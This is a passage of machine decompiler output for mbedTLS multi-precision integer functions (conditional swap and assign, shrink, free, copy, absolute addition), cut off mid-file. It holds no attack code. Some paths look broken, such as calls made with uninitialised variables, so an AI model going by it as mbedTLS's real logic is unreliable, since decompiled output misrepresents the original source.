        if (g1 == 0) {
            int32_t result = mbedtls_mpi_read_binary(a1, (char *)g7, g3); // 0x80574c9
            g3 = v2;
            g7 = v3;
            return result;
        }
        // 0x80574a0
        result2 = g1;
        // branch -> 0x805748f
    }
    // 0x805748f
    g3 = v2;
    g7 = v3;
    return result2;
}

// Address range: 0x80574e0 - 0x80575cf
int32_t mbedtls_mpi_safe_cond_swap(int32_t * a1, int32_t * a2, uint32_t a3) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = (int32_t)a2;
    int32_t v3 = g3; // 0x80574e8
    g3 = v1;
    int32_t v4 = g7; // 0x80574ee
    g7 = v2;
    int32_t v5 = g5; // 0x80574f4
    g5 = a3 % 256;
    if (a1 == a2) {
        // 0x8057512
        g3 = v3;
        g7 = v4;
        g5 = v5;
        return 0;
    }
    int32_t v6 = mbedtls_mpi_grow(v1, (char *)*(int32_t *)(v2 + 4)); // 0x8057509
    int32_t result2 = v6; // 0x805751e_2
    if (v6 == 0) {
        int32_t result = mbedtls_mpi_grow(g7, (char *)*(int32_t *)(g3 + 4)); // 0x805752a
        if (result == 0) {
            int32_t * v7 = (int32_t *)g3; // 0x8057535_0
            int32_t v8 = *v7; // 0x8057535
            uint32_t v9 = (g5 | -g5) / 128 % 2; // 0x805753b
            int32_t v10 = -v9;
            int32_t v11 = -((v9 ^ 1));
            *v7 = (v8 & v11) + (*(int32_t *)g7 & v10);
            int32_t * v12 = (int32_t *)g7; // 0x8057566_0
            int32_t v13 = (*v12 & v11) + (v8 & v10); // 0x805756b
            g4 = v13;
            *v12 = v13;
            if (*(int32_t *)(g3 + 4) == 0) {
                // 0x8057533
                // branch -> 0x8057512
                // 0x8057512
                g3 = v3;
                g7 = v4;
                g5 = v5;
                return result;
            }
            int32_t v14 = 0; // edx
            int32_t v15 = *(int32_t *)(g7 + 8); // 0x8057577
            g4 = v15;
            int32_t v16 = 0; // 0x805759f
            // branch -> 0x8057588
            while (true) {
                int32_t v17 = 4 * v16; // 0x8057588
                int32_t * v18 = (int32_t *)(v17 + *(int32_t *)(g3 + 8)); // 0x8057588_0
                int32_t v19 = *v18; // 0x8057588
                *v18 = (*(int32_t *)(v17 + v15) & v10) + (v19 & v11);
                int32_t * v20 = (int32_t *)(4 * v14 + g4); // 0x80575a5_0
                *v20 = (*v20 & v11) + (v19 & v10);
                int32_t v21 = v14 + 1; // 0x80575b2
                v14 = v21;
                if (*(int32_t *)(g3 + 4) <= v21) {
                    // 0x80575ba
                    g3 = v3;
                    g7 = v4;
                    g5 = v5;
                    return result;
                }
                // 0x8057588
                v15 = g4;
                v16 = v21;
                // branch -> 0x8057588
            }
        } else {
            result2 = result;
        }
    }
    // 0x8057512
    g3 = v3;
    g7 = v4;
    g5 = v5;
    return result2;
}

// Address range: 0x80575d0 - 0x805768f
int32_t mbedtls_mpi_safe_cond_assign(int32_t * a1, int32_t * a2, uint32_t a3) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = (int32_t)a2;
    int32_t v3 = g7; // 0x80575d4
    int32_t v4 = g3; // 0x80575d5
    g5 = v2;
    g3 = v1;
    g7 = a3 % 256;
    int32_t result = mbedtls_mpi_grow(v1, (char *)*(int32_t *)(v2 + 4)); // 0x80575ed
    int32_t v5;
    if (result == 0) {
        int32_t * v6 = (int32_t *)g3; // 0x80575ff_0
        uint32_t v7 = (g7 | -g7) / 128 % 2; // 0x805760a
        int32_t v8 = v7 ^ 1;
        g6 = v8;
        int32_t v9 = -v7;
        g4 = *(int32_t *)(g5 + 4);
        *v6 = (*v6 & -v8) + (*(int32_t *)g5 & v9);
        int32_t v10; // 0x8057679
        int32_t * v11; // 0x8057670_0
        int32_t v12; // eax
        int32_t v13; // 0x8057669
        int32_t v14; // 0x8057664
        int32_t v15; // 0x8057669
        if (g4 == 0) {
            // 0x80575fd
            v14 = 0;
            v13 = g3;
            // branch -> 0x8057664
        } else {
            int32_t v16 = g3; // 0x805762c
            int32_t v17 = *(int32_t *)(v16 + 8); // 0x805762c
            g4 = v17;
            v12 = 0;
            int32_t v18 = 0; // 0x8057653
            // branch -> 0x8057640
            while (true) {
                int32_t v19 = 4 * v18; // 0x8057640
                int32_t * v20 = (int32_t *)(v19 + v17); // 0x8057640_0
                int32_t v21 = *(int32_t *)(v19 + *(int32_t *)(g5 + 8)); // 0x805764c
                *v20 = (v21 & v9) + g6 * *v20;
                int32_t v22 = v12 + 1; // 0x8057659
                v12 = v22;
                if (*(int32_t *)(g5 + 4) <= v22) {
                    // 0x8057661
                    g3 = v16;
                    v14 = v22;
                    v13 = v16;
                    // branch -> 0x8057664
                    // 0x8057664
                    if (v14 < *(int32_t *)(v13 + 4)) {
                        // 0x8057669
                        v15 = *(int32_t *)(v13 + 8);
                        g4 = v15;
                        int32_t v23 = v14; // 0x8057676
                        int32_t v24 = v15; // 0x8057676
                        // branch -> 0x8057670
                        while (true) {
                            // 0x8057670
                            v11 = (int32_t *)(4 * v23 + v24);
                            *v11 = g6 * *v11;
                            v10 = v12 + 1;
                            v12 = v10;
                            if (*(int32_t *)(g3 + 4) <= v10) {
                                // 0x8057681
                                // branch -> 0x8057681
                                // 0x8057681
                                g3 = v4;
                                g7 = v3;
                                g2 = v5;
                                return result;
                            }
                          lab_0x8057670:
                            // 0x8057670
                            v23 = v10;
                            v24 = g4;
                            // branch -> 0x8057670
                        }
                    }
                    // 0x8057681
                    g3 = v4;
                    g7 = v3;
                    g2 = v5;
                    return result;
                }
                // 0x8057640
                v18 = v22;
                v17 = g4;
                // branch -> 0x8057640
            }
        }
        // 0x8057664
        if (v14 < *(int32_t *)(v13 + 4)) {
            // 0x8057669
            v15 = *(int32_t *)(v13 + 8);
            g4 = v15;
            // branch -> 0x8057670
            while (true) {
                // 0x8057670
                v11 = (int32_t *)(4 * v14 + v15);
                *v11 = g6 * *v11;
                v10 = 1;
                v12 = v10;
                if (*(int32_t *)(g3 + 4) > v10) {
                    goto lab_0x8057670;
                }
                // 0x8057681
                // branch -> 0x8057681
                // 0x8057681
                g3 = v4;
                g7 = v3;
                g2 = v5;
                return result;
            }
        }
    }
    // 0x8057681
    g3 = v4;
    g7 = v3;
    g2 = v5;
    return result;
}

// Address range: 0x8057690 - 0x805776f
int32_t mbedtls_mpi_shrink(int32_t a1, char * a2) {
    int32_t v1 = g3; // 0x8057696
    int32_t v2 = g7; // 0x805769c
    int32_t v3 = (int32_t)a2;
    int32_t v4 = g5; // 0x80576a2
    int32_t v5 = *(int32_t *)(a1 + 4); // 0x80576a5
    int32_t v6 = v5; // edi
    if (v5 <= v3) {
        // 0x80576ac
        g3 = v1;
        g7 = v2;
        g5 = v4;
        int32_t v7;
        int32_t v8;
        return mbedtls_mpi_grow(v8, (char *)v7);
    }
    int32_t v9 = v5 - 1; // 0x80576c2
    int32_t v10; // 0x805773b
    char * mem; // 0x80576fd
    int32_t v11; // 0x80576ed
    int32_t nmemb; // 0x80576fa
    int32_t v12; // 0x805770d
    int32_t v13; // 0x805772b
    int32_t v14; // 0x805770d
    int32_t v15; // 0x805772e
    int32_t v16; // 0x8057731
    int32_t v17; // 0x805773e
    if (v5 == 1) {
        // 0x80576e8
        v6 = 1;
        v11 = 1;
        // branch -> 0x80576ed
    } else {
        int32_t v18 = *(int32_t *)(a1 + 8); // 0x80576c7
        if (*(int32_t *)(v18 + 4 * v9) == 0) {
            while (true) {
                int32_t v19 = v9 - 1; // 0x80576e3
                if (v19 == 0) {
                    // 0x80576e8
                    // branch -> 0x80576e8
                    // 0x80576e8
                    v6 = 1;
                    v11 = 1;
                    // branch -> 0x80576ed
                } else {
                    // 0x80576d8
                    if (*(int32_t *)(4 * v19 + v18) != 0) {
                        // break -> 0x8057768
                        break;
                    }
                    v9 = v19;
                    // continue -> 0x80576e3
                    continue;
                }
                // 0x80576ed
                nmemb = v11;
                if (v11 < v3) {
                    // if_80576ef_0_true
                    v6 = v3;
                    nmemb = v3;
                    // branch -> after_if_80576ef_0
                }
                // after_if_80576ef_0
                mem = calloc(nmemb, 4);
                int32_t v20 = (int32_t)mem; // esi
                if (mem == NULL) {
                    // 0x8057756
                    g3 = v1;
                    g7 = v2;
                    g5 = v4;
                    return -16;
                }
                // 0x805770d
                v12 = a1;
                v14 = *(int32_t *)(v12 + 8);
                if (v14 == 0) {
                    // 0x805774e
                    *(int32_t *)(v12 + 4) = v6;
                    *(int32_t *)(a1 + 8) = v20;
                    // branch -> 0x8057756
                    // 0x8057756
                    g3 = v1;
                    g7 = v2;
                    g5 = v4;
                    return 0;
                }
                // 0x8057714
                memcpy(mem, (char *)v14, 4 * v6);
                v13 = a1;
                v15 = *(int32_t *)(v13 + 8);
                v16 = 4 * *(int32_t *)(v13 + 4);
                if (v16 == 0) {
                    // 0x8057746
                    free((char *)v15);
                    // branch -> 0x805774e
                    // 0x805774e
                    *(int32_t *)(a1 + 4) = v6;
                    *(int32_t *)(a1 + 8) = v20;
                    // branch -> 0x8057756
                    // 0x8057756
                    g3 = v1;
                    g7 = v2;
                    g5 = v4;
                    return 0;
                }
                *(char *)v15 = 0;
                v10 = v15 + 1;
                v17 = v16 - 1;
                while (v17 != 0) {
                    // 0x8057738
                    *(char *)v10 = 0;
                    v10++;
                    v17--;
                    // continue -> 0x8057738
                }
                // 0x8057743
                // branch -> 0x8057746
                // 0x8057746
                free((char *)*(int32_t *)(a1 + 8));
                // branch -> 0x805774e
                // 0x805774e
                *(int32_t *)(a1 + 4) = v6;
                *(int32_t *)(a1 + 8) = v20;
                // branch -> 0x8057756
                // 0x8057756
                g3 = v1;
                g7 = v2;
                g5 = v4;
                return 0;
            }
        } else {
            v11 = v5;
        }
    }
    // 0x80576ed
    nmemb = v11;
    if (v11 < v3) {
        // if_80576ef_0_true
        v6 = v3;
        nmemb = v3;
        // branch -> after_if_80576ef_0
    }
    // after_if_80576ef_0
    mem = calloc(nmemb, 4);
    if (mem == NULL) {
        // 0x8057756
        g3 = v1;
        g7 = v2;
        g5 = v4;
        return -16;
    }
    // 0x805770d
    v12 = a1;
    v14 = *(int32_t *)(v12 + 8);
    int32_t v21 = v12; // 0x805774e
    if (v14 != 0) {
        // 0x8057714
        memcpy(mem, (char *)v14, 4 * v6);
        v13 = a1;
        v15 = *(int32_t *)(v13 + 8);
        v16 = 4 * *(int32_t *)(v13 + 4);
        int32_t v22 = v15; // 0x8057746
        if (v16 != 0) {
            *(char *)v15 = 0;
            v10 = v15 + 1;
            v17 = v16 - 1;
            while (v17 != 0) {
                // 0x8057738
                *(char *)v10 = 0;
                v10++;
                v17--;
                // continue -> 0x8057738
            }
            // 0x8057743
            v22 = *(int32_t *)(a1 + 8);
            // branch -> 0x8057746
        }
        // 0x8057746
        free((char *)v22);
        v21 = a1;
        // branch -> 0x805774e
    }
    // 0x805774e
    *(int32_t *)(v21 + 4) = v6;
    *(int32_t *)(a1 + 8) = (int32_t)mem;
    // branch -> 0x8057756
    // 0x8057756
    g3 = v1;
    g7 = v2;
    g5 = v4;
    return 0;
}

// Address range: 0x8057770 - 0x80577bf
int32_t mbedtls_mpi_free(int32_t * a1) {
    int32_t v1 = (int32_t)a1;
    int32_t v2;
    if (a1 == NULL) {
        // 0x80577ba
        g2 = v2;
        return g1;
    }
    int32_t v3 = *(int32_t *)(v1 + 8); // 0x805777e
    g6 = v3;
    if (v3 != 0) {
        int32_t v4 = 4 * *(int32_t *)(v1 + 4); // 0x8057788
        g1 = v4;
        if (v4 != 0) {
            *(char *)v3 = 0;
            int32_t v5 = g6 + 1; // 0x8057793
            g6 = v5;
            int32_t v6 = g1 - 1; // 0x8057796
            g1 = v6;
            while (v6 != 0) {
                // 0x8057790
                *(char *)v5 = 0;
                v5 = g6 + 1;
                g6 = v5;
                v6 = g1 - 1;
                g1 = v6;
                // continue -> 0x8057790
            }
            int32_t v7 = *(int32_t *)(v1 + 8); // 0x805779b
            g6 = v7;
            v3 = v7;
            // branch -> 0x805779e
        }
        // 0x805779e
        free((char *)v3);
        // branch -> 0x80577a6
    }
    // 0x80577a6
    *(int32_t *)v1 = 1;
    *(int32_t *)(v1 + 4) = 0;
    *(int32_t *)(v1 + 8) = 0;
    // branch -> 0x80577ba
    // 0x80577ba
    g2 = v2;
    return g1;
}

// Address range: 0x80577c0 - 0x805788f
int32_t mbedtls_mpi_copy(char * a1, int32_t * a2) {
    int32_t v1 = (int32_t)a2;
    int32_t v2 = g5; // 0x80577c3
    g5 = 0;
    int32_t v3 = g7; // 0x80577c6
    int32_t v4 = g3; // 0x80577c7
    g7 = (int32_t)a1;
    g3 = v1;
    int32_t v5;
    if ((char *)a2 == a1) {
        // 0x8057822
        g3 = v4;
        g7 = v3;
        g5 = v2;
        g2 = v5;
        return 0;
    }
    int32_t v6 = *(int32_t *)(v1 + 8); // 0x80577d5
    g4 = v6;
    int32_t result2; // 0x8057825
    if (v6 == 0) {
        // 0x805787d
        mbedtls_mpi_free((int32_t *)a1);
        result2 = g5;
        // branch -> 0x8057822
    } else {
        int32_t v7 = *(int32_t *)(v1 + 4); // 0x80577e0
        g6 = v7;
        int32_t v8 = v7 - 1; // 0x80577e5
        int32_t result; // 0x8057817
        int32_t v9; // 0x8057830
        int32_t v10; // 0x805780b
        int32_t v11; // 0x8057833
        int32_t v12; // 0x8057853
        int32_t v13; // 0x8057856
        if (v7 == 1) {
            // 0x8057804
            g6 = 1;
            v10 = 1;
            // branch -> 0x8057809
        } else {
            int32_t v14 = *(int32_t *)(4 * v8 + v6); // 0x80577ea
            g5 = v14;
            if (v14 == 0) {
                while (true) {
                    int32_t v15 = v8 - 1; // 0x80577ff
                    if (v15 == 0) {
                        // 0x8057804
                        // branch -> 0x8057804
                        // 0x8057804
                        g6 = 1;
                        // branch -> 0x8057809
                    } else {
                        int32_t v16 = *(int32_t *)(4 * v15 + v6); // 0x80577f8
                        g5 = v16;
                        if (v16 != 0) {
                            // break -> 0x8057878
                            break;
                        }
                        v8 = v15;
                        // continue -> 0x80577ff
                        continue;
                    }
                    // 0x8057809
                    *(int32_t *)a1 = *a2;
                    result = mbedtls_mpi_grow(g7, (char *)g6);
                    if (result != 0) {
                        // 0x8057822
                        g3 = v4;
                        g7 = v3;
                        g5 = v2;
                        g2 = v5;
                        return result;
                    }
                    // 0x8057830
                    v9 = g7;
                    v11 = *(int32_t *)(v9 + 8);
                    memset((char *)v11, 0, 4 * *(int32_t *)(v9 + 4));
                    v12 = *(int32_t *)(g3 + 8);
                    g4 = v12;
                    v13 = 4;
                    g6 = v13;
                    memcpy((char *)*(int32_t *)(g7 + 8), (char *)v12, v13);
                    g3 = v4;
                    g7 = v3;
                    g5 = v2;
                    g2 = v5;
                    return result;
                }
                // 0x8057878
                g6 = v8;
                v10 = v8;
                // branch -> 0x8057809
            } else {
                v10 = v7;
            }
        }
        // 0x8057809
        *(int32_t *)a1 = *a2;
        result = mbedtls_mpi_grow(g7, (char *)g6);
        if (result == 0) {
            // 0x8057830
            v9 = g7;
            v11 = *(int32_t *)(v9 + 8);
            memset((char *)v11, 0, 4 * *(int32_t *)(v9 + 4));
            v12 = *(int32_t *)(g3 + 8);
            g4 = v12;
            v13 = 4 * v10;
            g6 = v13;
            memcpy((char *)*(int32_t *)(g7 + 8), (char *)v12, v13);
            g3 = v4;
            g7 = v3;
            g5 = v2;
            g2 = v5;
            return result;
        }
        result2 = result;
    }
    // 0x8057822
    g3 = v4;
    g7 = v3;
    g5 = v2;
    g2 = v5;
    return result2;
}

// Address range: 0x8057890 - 0x80579cf
int32_t mbedtls_mpi_add_abs(int32_t * a1, int32_t a2, int32_t a3) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = g5; // 0x8057893
    g5 = v1;
    g3 = a3;
    g1 = a2;
    int32_t v3; // 0x8057945
    int32_t v4; // 0x8057936
    int32_t result; // 0x80578f8
    int32_t v5; // eax
    int32_t v6; // edi
    int32_t v7; // 0x80578cb
    int32_t v8; // 0x8057942
    int32_t v9; // 0x805794b
    int32_t v10; // 0x805797c
    int32_t v11; // 0x805792b
    int32_t v12; // 0x80578e8
    int32_t v13; // 0x805790d
    int32_t v14; // 0x8057971
    int32_t v15; // 0x80579a5
    int32_t v16; // 0x80578d2
    int32_t v17; // 0x805792b
    int32_t v18; // 0x805794d
    int32_t v19; // 0x8057957
    int32_t v20; // 0x805792b
    int32_t v21; // 0x805793f
    int32_t v22; // 0x80578cf
    int32_t v23; // 0x80578d5
    int32_t v24; // 0x80578f1
    int32_t v25; // 0x8057908
    int32_t v26; // 0x805790d
    int32_t v27; // 0x8057983
    uint32_t v28; // 0x805793f
    int32_t v29; // 0x8057936
    int32_t v30; // 0x80578e0
    if (v1 == a3) {
        // 0x80579c0
        g3 = a2;
        // branch -> 0x80578c2
        // 0x80578c2
        g7 = *(int32_t *)(a2 + 4);
        *(int32_t *)a3 = 1;
        v7 = g7;
        v24 = 0;
        if (v7 != 0) {
            // 0x80578cf
            v22 = *(int32_t *)(g3 + 8);
            g6 = v22;
            v16 = v7 - 1;
            v23 = *(int32_t *)(v22 + 4 * v16);
            g4 = v23;
            if (v23 == 0) {
                // 0x80578eb
                g7 = v16;
                if (v16 != 0) {
                    // 0x80578e0
                    v12 = v16;
                    // branch -> 0x80578e0
                    while (true) {
                        // 0x80578e0
                        v30 = *(int32_t *)(v22 - 4 + 4 * v12);
                        g4 = v30;
                        if (v30 == 0) {
                            goto lab_0x80578e8_2;
                        }
                        // 0x80578e0
                        // branch -> 0x80578f1
                    }
                }
                // 0x80578f1
                result = mbedtls_mpi_grow(g5, (char *)0);
                v5 = result;
                if (result == 0) {
                    // 0x8057908
                    v25 = *(int32_t *)(g3 + 8);
                    v13 = g5;
                    v26 = *(int32_t *)(v13 + 8);
                    g4 = v26;
                    if (g7 != 0) {
                        // 0x8057919
                        g3 = 0;
                        v6 = v25;
                        v20 = *(int32_t *)v26;
                        v11 = 0;
                        // branch -> 0x805792b
                        while (true) {
                            // 0x805792b
                            v17 = v11 + v20;
                            *(int32_t *)v26 = v17;
                            v29 = 4 * v5;
                            v4 = *(int32_t *)(v29 + v6) + v17;
                            *(int32_t *)(g4 + v29) = v4;
                            v21 = v5;
                            v28 = *(int32_t *)(4 * v21 + v6);
                            v8 = v4 < v28;
                            v3 = v21 + 1;
                            v5 = v3;
                            g6 = v8;
                            v9 = g7;
                            v18 = v8 + (((int32_t)(v20 == 0 | v11 < v17) | g3 & -256) ^ 1) % 2;
                            g3 = v18;
                            if (v9 > v3) {
                                goto lab_0x8057928_4;
                            }
                            // 0x8057952
                            v19 = g4 + 4 * v9;
                            v5 = v19;
                            if (v18 != 0) {
                                // 0x805795c
                                g4 = v13;
                                g5 = v9 + 1;
                                g6 = v13;
                                v27 = v9;
                                v15 = v13;
                                // branch -> 0x8057983
                                while (true) {
                                    // 0x8057983
                                    if (v27 < *(int32_t *)(v15 + 4)) {
                                        v14 = v27;
                                        v10 = v19;
                                        goto lab_0x8057968_5;
                                    }
                                    goto lab_0x8057988_4;
                                }
                            }
                        }
                    }
                }
                // 0x80579b0
                // branch -> 0x80579b3
                // 0x80579b3
                g5 = v2;
                return result;
            }
            v24 = v7;
        }
        // 0x80578f1
        result = mbedtls_mpi_grow(g5, (char *)v24);
        v5 = result;
        if (result != 0) {
            // 0x80579b0
            // branch -> 0x80579b3
            // 0x80579b3
            g5 = v2;
            return result;
        }
        // 0x8057908
        v25 = *(int32_t *)(g3 + 8);
        v13 = g5;
        v26 = *(int32_t *)(v13 + 8);
        g4 = v26;
        if (g7 != 0) {
            // 0x8057919
            g3 = 0;
            v6 = v25;
            v20 = *(int32_t *)v26;
            v11 = 0;
            // branch -> 0x805792b
            while (true) {
                // 0x805792b
                v17 = v11 + v20;
                *(int32_t *)v26 = v17;
                v29 = 4 * v5;
                v4 = *(int32_t *)(v29 + v6) + v17;
                *(int32_t *)(g4 + v29) = v4;
                v21 = v5;
                v28 = *(int32_t *)(4 * v21 + v6);
                v8 = v4 < v28;
                v3 = v21 + 1;
                v5 = v3;
                g6 = v8;
                v9 = g7;
                v18 = v8 + (((int32_t)(v20 == 0 | v11 < v17) | g3 & -256) ^ 1) % 2;
                g3 = v18;
                if (v9 > v3) {
                    goto lab_0x8057928_4;
                }
                // 0x8057952
                v19 = g4 + 4 * v9;
                v5 = v19;
                if (v18 != 0) {
                    // 0x805795c
                    g4 = v13;
                    g5 = v9 + 1;
                    g6 = v13;
                    v27 = v9;
                    v15 = v13;
                    // branch -> 0x8057983
                    while (true) {
                        // 0x8057983
                        if (v27 < *(int32_t *)(v15 + 4)) {
                            v14 = v27;
                            v10 = v19;
                            goto lab_0x8057968_5;
                        }
                        goto lab_0x8057988_4;
                    }
                }
                // 0x80579b0
                // branch -> 0x80579b3
                // 0x80579b3
                g5 = v2;
                return result;
            }
        }
        // 0x80579b0
        // branch -> 0x80579b3
        // 0x80579b3
        g5 = v2;
        return result;
    }
    // 0x80578aa
    if (v1 == a2) {
        // 0x80578c2
        g7 = *(int32_t *)(a3 + 4);
        *(int32_t *)a2 = 1;
        v7 = g7;
        v24 = 0;
        if (v7 != 0) {
            // 0x80578cf
            v22 = *(int32_t *)(g3 + 8);
            g6 = v22;
            v16 = v7 - 1;
            v23 = *(int32_t *)(v22 + 4 * v16);
            g4 = v23;
            if (v23 == 0) {
                // 0x80578eb
                g7 = v16;
                if (v16 != 0) {
                    // 0x80578e0
                    v12 = v16;
                    // branch -> 0x80578e0
                    while (true) {
                        // 0x80578e0
                        v30 = *(int32_t *)(v22 - 4 + 4 * v12);
                        g4 = v30;
                        if (v30 == 0) {
                            goto lab_0x80578e8_2;
                        }
                        // 0x80578e0
                        // branch -> 0x80578f1
                    }
                } else {
                    v24 = 0;
                }
            } else {
                v24 = v7;
            }
        }
        // 0x80578f1
        result = mbedtls_mpi_grow(g5, (char *)v24);
        v5 = result;
        if (result == 0) {
            // 0x8057908
            v25 = *(int32_t *)(g3 + 8);
            v13 = g5;
            v26 = *(int32_t *)(v13 + 8);
            g4 = v26;
            if (g7 != 0) {
                // 0x8057919
                g3 = 0;
                v6 = v25;
                v20 = *(int32_t *)v26;
                v11 = 0;
                // branch -> 0x805792b
                while (true) {
                    // 0x805792b
                    v17 = v11 + v20;
                    *(int32_t *)v26 = v17;
                    v29 = 4 * v5;
                    v4 = *(int32_t *)(v29 + v6) + v17;
                    *(int32_t *)(g4 + v29) = v4;
                    v21 = v5;
                    v28 = *(int32_t *)(4 * v21 + v6);
                    v8 = v4 < v28;
                    v3 = v21 + 1;
                    v5 = v3;
                    g6 = v8;
                    v9 = g7;
                    v18 = v8 + (((int32_t)(v20 == 0 | v11 < v17) | g3 & -256) ^ 1) % 2;
                    g3 = v18;
                    if (v9 > v3) {
                        goto lab_0x8057928_4;
                    }
                    // 0x8057952
                    v19 = g4 + 4 * v9;
                    v5 = v19;
                    if (v18 != 0) {
                        // 0x805795c
                        g4 = v13;
                        g5 = v9 + 1;
                        g6 = v13;
                        v27 = v9;
                        v15 = v13;
                        // branch -> 0x8057983
                        while (true) {
                            // 0x8057983
                            if (v27 < *(int32_t *)(v15 + 4)) {
                                v14 = v27;
                                v10 = v19;
                                goto lab_0x8057968_5;
                            }
                            goto lab_0x8057988_4;
                        }
                    }
                }
            }
        }
        // 0x80579b0
        // branch -> 0x80579b3
        // 0x80579b3
        g5 = v2;
        return result;
    }
    int32_t v31 = mbedtls_mpi_copy((char *)a1, (int32_t *)a2); // 0x80578b5
    int32_t result3 = v31; // 0x80579ba_2
    if (v31 == 0) {
        // 0x80578ae
        // branch -> 0x80578c2
        // 0x80578c2
        g7 = *(int32_t *)(g3 + 4);
        *(int32_t *)g5 = 1;
        v7 = g7;
        v24 = 0;
        if (v7 != 0) {
            // 0x80578cf
            v22 = *(int32_t *)(g3 + 8);
            g6 = v22;
            v16 = v7 - 1;
            v23 = *(int32_t *)(v22 + 4 * v16);
            g4 = v23;
            if (v23 == 0) {
                // 0x80578eb
                g7 = v16;
                if (v16 != 0) {
                    // 0x80578e0
                    v12 = v16;
                    // branch -> 0x80578e0
                    while (true) {
                        // 0x80578e0
                        v30 = *(int32_t *)(v22 - 4 + 4 * v12);
                        g4 = v30;
                        if (v30 == 0) {
                          lab_0x80578e8_2:;
                            int32_t v32 = v12 - 1; // 0x80578e8
                            g7 = v32;
                            if (v32 == 0) {
                                v24 = 0;
                                // break -> 0x80578eb
                                break;
                            }
                            v12 = v32;
                            // continue -> 0x80578e0
                            continue;
                        }
                        // 0x80578f1
                        result = mbedtls_mpi_grow(g5, (char *)v12);
                        v5 = result;
                        if (result == 0) {
                            // 0x8057908
                            v25 = *(int32_t *)(g3 + 8);
                            v13 = g5;
                            v26 = *(int32_t *)(v13 + 8);
                            g4 = v26;
                            if (g7 != 0) {
                                // 0x8057919
                                g3 = 0;
                                v6 = v25;
                                int32_t v33 = 0; // 0x8057930
                                int32_t v34 = v26; // 0x8057930
                                v20 = *(int32_t *)v26;
                                v11 = 0;
                                // branch -> 0x805792b
                                while (true) {
                                    // 0x805792b
                                    v17 = v11 + v20;
                                    *(int32_t *)(4 * v33 + v34) = v17;
                                    v29 = 4 * v5;
                                    v4 = *(int32_t *)(v29 + v6) + v17;
                                    *(int32_t *)(g4 + v29) = v4;
                                    v21 = v5;
                                    v28 = *(int32_t *)(4 * v21 + v6);
                                    v8 = v4 < v28;
                                    v3 = v21 + 1;
                                    v5 = v3;
                                    g6 = v8;
                                    v9 = g7;
                                    v18 = v8 + (((int32_t)(v20 == 0 | v11 < v17) | g3 & -256) ^ 1) % 2;
                                    g3 = v18;
                                    if (v9 <= v3) {
                                        // 0x8057952
                                        v19 = g4 + 4 * v9;
                                        v5 = v19;
                                        if (v18 != 0) {
                                            // 0x805795c
                                            g4 = v13;
                                            g5 = v9 + 1;
                                            g6 = v13;
                                            int32_t v35 = v19; // 0x805796845
                                            v27 = v9;
                                            v15 = v13;
                                            // branch -> 0x8057983
                                            while (true) {
                                                // 0x8057983
                                                int32_t result2; // 0x8057992
                                                if (v27 < *(int32_t *)(v15 + 4)) {
                                                    v14 = v27;
                                                    v10 = v35;
                                                  lab_0x8057968_5:;
                                                    int32_t * v36 = (int32_t *)v10; // 0x8057968_0
                                                    int32_t v37 = *v36; // 0x8057968
                                                    uint32_t v38 = g3; // 0x805796a
                                                    int32_t v39 = v38 + v37; // 0x805796a
                                                    g4 = v39;
                                                    bool v40 = v37 == 0 | v38 < v39; // 0x805796e
                                                    g7 = v14 + 1;
                                                    g3 = (int32_t)v40 ^ 1;
                                                    g5++;
                                                    *v36 = v39;
                                                    if (v40) {
                                                        // 0x80579b0
                                                        // branch -> 0x80579b3
                                                        // 0x80579b3
                                                        g5 = v2;
                                                        return result;
                                                    }
                                                    int32_t v41 = v5 + 4; // 0x8057980
                                                    v5 = v41;
                                                    v35 = v41;
                                                    v27 = g7;
                                                    v15 = g6;
                                                    // branch -> 0x8057983
                                                    continue;
                                                } else {
                                                  lab_0x8057988_4:
                                                    // 0x8057988
                                                    result2 = mbedtls_mpi_grow(v15, (char *)g5);
                                                    g6 = v15;
                                                    if (result2 == 0) {
                                                        int32_t v42 = g7; // 0x805799e
                                                        int32_t v43 = *(int32_t *)(v15 + 8) + 4 * v42; // 0x80579a5
                                                        v5 = v43;
                                                        v14 = v42;
                                                        v10 = v43;
                                                        // branch -> 0x8057968
                                                        goto lab_0x8057968_5;
                                                    }
                                                }
                                                // 0x80579b3
                                                g5 = v2;
                                                return result2;
                                            }
                                        }
                                        // 0x80579b0
                                        // branch -> 0x80579b3
                                        // 0x80579b3
                                        g5 = v2;
                                        return result;
                                    }
                                  lab_0x8057928_4:;
                                    int32_t v44 = g4; // 0x8057928
                                    v33 = v3;
                                    v34 = v44;
                                    v20 = *(int32_t *)(v44 + 4 * v3);
                                    v11 = v18;
                                    // branch -> 0x805792b
                                }
                            }
                        }
                        // 0x80579b0
                        // branch -> 0x80579b3
                        // 0x80579b3
                        g5 = v2;
                        return result;
                    }
                } else {
                    v24 = 0;
                }
            } else {
                v24 = v7;
            }
        }
        // 0x80578f1
        result = mbedtls_mpi_grow(g5, (char *)v24);
        v5 = result;
        if (result == 0) {
            // 0x8057908
            v25 = *(int32_t *)(g3 + 8);
            v13 = g5;
            v26 = *(int32_t *)(v13 + 8);
            g4 = v26;
            if (g7 != 0) {
                // 0x8057919
                g3 = 0;
                v6 = v25;
                v20 = *(int32_t *)v26;
                v11 = 0;
                // branch -> 0x805792b
                while (true) {
                    // 0x805792b
                    v17 = v11 + v20;
                    *(int32_t *)v26 = v17;
                    v29 = 4 * v5;
                    v4 = *(int32_t *)(v29 + v6) + v17;
                    *(int32_t *)(g4 + v29) = v4;
                    v21 = v5;
                    v28 = *(int32_t *)(4 * v21 + v6);
                    v8 = v4 < v28;
                    v3 = v21 + 1;
                    v5 = v3;
                    g6 = v8;
                    v9 = g7;
                    v18 = v8 + (((int32_t)(v20 == 0 | v11 < v17) | g3 & -256) ^ 1) % 2;
                    g3 = v18;
                    if (v9 > v3) {
                        goto lab_0x8057928_4;
                    }
                    // 0x8057952
                    v19 = g4 + 4 * v9;
                    v5 = v19;
                    if (v18 != 0) {
                        // 0x805795c
                        g4 = v13;
                        g5 = v9 + 1;
                        g6 = v13;
                        v27 = v9;
                        v15 = v13;
                        // branch -> 0x8057983
                        while (true) {
                            // 0x8057983
                            if (v27 < *(int32_t *)(v15 + 4)) {
                                v14 = v27;
                                v10 = v19;
                                goto lab_0x8057968_5;
                            }
                            goto lab_0x8057988_4;
                        }
                    }
                }
            }
        }
        // 0x80579b0
        result3 = result;
        // branch -> 0x80579b3
    }
    // 0x80579b3
    g5 = v2;
    return result3;
}

// Address range: 0x80579d0 - 0x8057e3f
int32_t mbedtls_mpi_mul_mpi(int32_t * a1, int32_t * a2, int32_t * a3) {
